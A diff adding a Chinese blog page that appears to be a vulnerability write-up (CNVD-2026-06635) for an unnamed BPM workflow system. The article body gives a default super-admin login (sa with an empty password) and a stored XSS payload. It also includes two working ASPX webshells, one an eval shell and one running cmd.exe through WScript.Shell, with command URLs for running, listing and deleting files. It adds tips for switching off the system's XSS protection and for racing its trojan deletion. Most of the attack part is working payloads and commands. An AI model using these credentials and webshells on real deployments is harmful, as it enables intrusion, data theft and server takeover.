@@ -1,0 +1,788 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/mimi.jpg">
+  <link rel="icon" href="/img/mimi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Goocean5263">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="某BPM系统通用漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某BPM系统通用漏洞-CNVD-2026-06635">
+<meta property="og:url" content="https://goocean5263.github.io/2025/11/03/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/index.html">
+<meta property="og:site_name" content="Gone with the Wind">
+<meta property="og:description" content="某BPM系统通用漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697691000-1773037769734-1.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697730000-1773037800328-3.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697773000-1773037826341-5.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697779000-1773037860618-7.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697819000-1773037908484-9.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697901000-1773037928106-11.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697917000-1773037951154-13.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697968000-1773038082167-15.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698177000-1773038113666-17.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698197000-1773038134395-19.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698369000-1773038195762-21.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698394000-1773038202967-23.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697112000-1773038222938-25.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698866000-1773038257223-27.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772699042000-1773038296111-29.png">
+<meta property="article:published_time" content="2025-11-03T07:33:42.000Z">
+<meta property="article:modified_time" content="2026-03-09T07:36:10.048Z">
+<meta property="article:author" content="Goocean5263">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="弱口令">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://goocean5263.github.io/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697691000-1773037769734-1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>某BPM系统通用漏洞-CNVD-2026-06635 - Gone with the Wind</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"goocean5263.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"b264de23432894f08f407e28d8a46a83","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?b264de23432894f08f407e28d8a46a83";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Gong with the wind</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="某BPM系统通用漏洞-CNVD-2026-06635"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-03 15:33" pubdate>
+          2025年11月3日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          876 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">某BPM系统通用漏洞-CNVD-2026-06635</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="某BPM系统通用漏洞-CNVD-2026-06635"><a href="#某BPM系统通用漏洞-CNVD-2026-06635" class="headerlink" title="某BPM系统通用漏洞-CNVD-2026-06635"></a>某BPM系统通用漏洞-CNVD-2026-06635</h1><p><strong>通用漏洞：弱口令、XSS、文件上传</strong></p>
+<p>弱口令都是</p>
+<p>账号：sa</p>
+<p>密码：(空)</p>
+<h2 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h2><h3 id="登录弱口令"><a href="#登录弱口令" class="headerlink" title="登录弱口令"></a>登录弱口令</h3><p>输入用户名为：<strong>sa</strong></p>
+<p>密码为<strong>空</strong><br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697691000-1773037769734-1.png" srcset="/img/loading.gif" lazyload alt="file_1772697691000"></p>
+<p>成功进入系统，是超级管理员权限，可以在左侧选择进行操作</p>
+<p><strong>在组织结构管理处可以查看公司敏感信息和修改用户密码</strong><br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697730000-1773037800328-3.png" srcset="/img/loading.gif" lazyload alt="file_1772697730000"></p>
+<p><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697773000-1773037826341-5.png" srcset="/img/loading.gif" lazyload alt="file_1772697773000"></p>
+<p><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697779000-1773037860618-7.png" srcset="/img/loading.gif" lazyload alt="file_1772697779000"></p>
+<hr>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>系统多处存在存储型XSS，这里在<strong>公共快速意见</strong>栏进行测试（系统无XSS防护，任意功能点均可测试）<br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697819000-1773037908484-9.png" srcset="/img/loading.gif" lazyload alt="file_1772697819000"></p>
+<p>新增或者编辑</p>
+<p>输入任意XSS payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;#&quot;</span> onclick=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697901000-1773037928106-11.png" srcset="/img/loading.gif" lazyload alt="file_1772697901000"><br>点击图片出现弹窗，确认<strong>存在XSS漏洞</strong><br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697917000-1773037951154-13.png" srcset="/img/loading.gif" lazyload alt="file_1772697917000"></p>
+<hr>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>在<strong>系统参数配置–&gt;系统设置</strong>处，可以任意上传文件<br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697968000-1773038082167-15.png" srcset="/img/loading.gif" lazyload alt="file_1772697968000"><br>任意一个点上传即可，这里选择<strong>首页logo设置</strong></p>
+<p>上传前先保存原图片，最后恢复原状</p>
+<p>上传aspx一句话木马，上传后点击保存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;zxcvbnm&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698177000-1773038113666-17.png" srcset="/img/loading.gif" lazyload alt="file_1772698177000"></p>
+<p>然后使用<strong>蚁剑</strong>进行连接</p>
+<p>右键点击空白处–&gt;新建数据<br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698197000-1773038134395-19.png" srcset="/img/loading.gif" lazyload alt="file_1772698197000"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">连接url：http:<span class="hljs-regexp">//</span>xxx<span class="hljs-regexp">/images/u</span>ploadFile/yijian.aspx<br>连接密码：zxcvbnm<br></code></pre></td></tr></table></figure>
+
+<p>测试连接成功，然后点击左上角保存<br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698369000-1773038195762-21.png" srcset="/img/loading.gif" lazyload alt="file_1772698369000"></p>
+<p><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698394000-1773038202967-23.png" srcset="/img/loading.gif" lazyload alt="file_1772698394000"></p>
+<hr>
+<h2 id="注1：XSS不成功"><a href="#注1：XSS不成功" class="headerlink" title="注1：XSS不成功"></a>注1：XSS不成功</h2><p>如果发现XSS注入不成功，则到<strong>系统参数设置–&gt;系统设置</strong>处往下翻</p>
+<p><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772697112000-1773038222938-25.png" srcset="/img/loading.gif" lazyload alt="file_1772697112000"></p>
+<p>找到**“防存储型XSS”**，然后关闭即可</p>
+<hr>
+<h2 id="注2：文件上传蚁剑无法连接"><a href="#注2：文件上传蚁剑无法连接" class="headerlink" title="注2：文件上传蚁剑无法连接"></a>注2：文件上传蚁剑无法连接</h2><ul>
+<li>处理办法1：<strong>直接传参执行命令</strong><br>网站无法执行eval，所以无法使用蚁剑进行连接，但仍可以上传一句话木马进行命令执行<br>修改aspx一句话木马内容，上传后点击保存</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;<br>&lt;%<br><br>        var cmd = Request.Item[&quot;zxcvbnm&quot;];<br>        if(cmd != null &amp;&amp; cmd != &quot;&quot;) &#123;<br>            var shell = new ActiveXObject(&quot;WScript.Shell&quot;);<br>            var exec = shell.Exec(&quot;cmd.exe /c &quot; + cmd);<br>            Response.Write(exec.StdOut.ReadAll());<br>        &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>访问网址，并输入参数和命令，参数为zxcvbnm</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx<span class="hljs-regexp">/images/u</span>ploadFile/Otest.aspx?zxcvbnm=ipconfig<br></code></pre></td></tr></table></figure>
+
+<p>可以看到<strong>成功执行命令</strong><br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772698866000-1773038257223-27.png" srcset="/img/loading.gif" lazyload alt="file_1772698866000"><br>最后删除文件</p>
+<p>因为上传的都是aspx文件，所以直接删除即可</p>
+<p>首先需要知道<strong>上传后的文件路径</strong>，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?zxcvbnm=<span class="hljs-built_in">dir</span> /s /b E:\uploadFile<br></code></pre></td></tr></table></figure>
+
+<p>得到路径：<strong>E:\BPMOA\BPM\images\uploadFile</strong></p>
+<p><strong>查看命令：</strong></p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">http:<span class="hljs-operator">//</span>xxx<span class="hljs-operator">/</span>images<span class="hljs-operator">/</span>uploadFile<span class="hljs-operator">/</span>Otest.aspx<span class="hljs-operator">?</span>zxcvbnm<span class="hljs-operator">=</span>dir <span class="hljs-symbol">/s</span> <span class="hljs-symbol">/b</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\B</span>PMOA<span class="hljs-char escape_">\B</span>PM<span class="hljs-char escape_">\i</span>mages<span class="hljs-char escape_">\u</span>ploadFile<span class="hljs-char escape_">\*</span>.aspx&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>删除命令：</strong></p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">http:<span class="hljs-operator">//</span>xxx<span class="hljs-operator">/</span>images<span class="hljs-operator">/</span>uploadFile<span class="hljs-operator">/</span>Otest.aspx<span class="hljs-operator">?</span>zxcvbnm<span class="hljs-operator">=</span>del <span class="hljs-symbol">/q</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\B</span>PMOA<span class="hljs-char escape_">\B</span>PM<span class="hljs-char escape_">\i</span>mages<span class="hljs-char escape_">\u</span>ploadFile<span class="hljs-char escape_">\*</span>.aspx&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>再传入参数会发现服务器报错，即成功删除木马文件</p>
+<ul>
+<li>处理办法2：<strong>条件竞争</strong><br>系统做了安全防护，识别到木马文件后会直接删除，但是有时间间隔，一直重复“上传–连接“的步骤即可连接成功<br><img src="/images/%E6%9F%90BPM%E7%B3%BB%E7%BB%9F%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CNVD-2026-06635/file_1772699042000-1773038296111-29.png" srcset="/img/loading.gif" lazyload alt="file_1772699042000"></li>
+</ul>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">本文所载程序、技术方法仅面向合法合规的安全研究与教学场景，旨在提升网络安全防护能力，具有明确的技术研究属性。<br><br>任何单位或个人未经授权，将本文内容用于攻击、破坏等非法用途的，由此引发的全部法律责任、民事赔偿及连带责任，均由行为人独立承担，本站不承担任何连带责任。<br><br>本站内容均为技术交流与知识分享目的发布，若存在版权侵权或其他异议，请通过邮件联系处理，具体联系方式可点击页面上方的关于。<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="category-chain-item">漏洞挖掘</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" class="print-no-link">#弱口令</a>
+      
+        <a href="/tags/XSS/" class="print-no-link">#XSS</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>某BPM系统通用漏洞-CNVD-2026-06635</div>
+      <div>https://goocean5263.github.io/2025/11/03/某BPM系统通用漏洞-CNVD-2026-06635/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Goocean5263</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/05/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" title="某靶场实战">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">某靶场实战</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/02/2025%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AF/" title="2025成都大学玄武杯">
+                        <span class="hidden-mobile">2025成都大学玄武杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Goocean5263</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
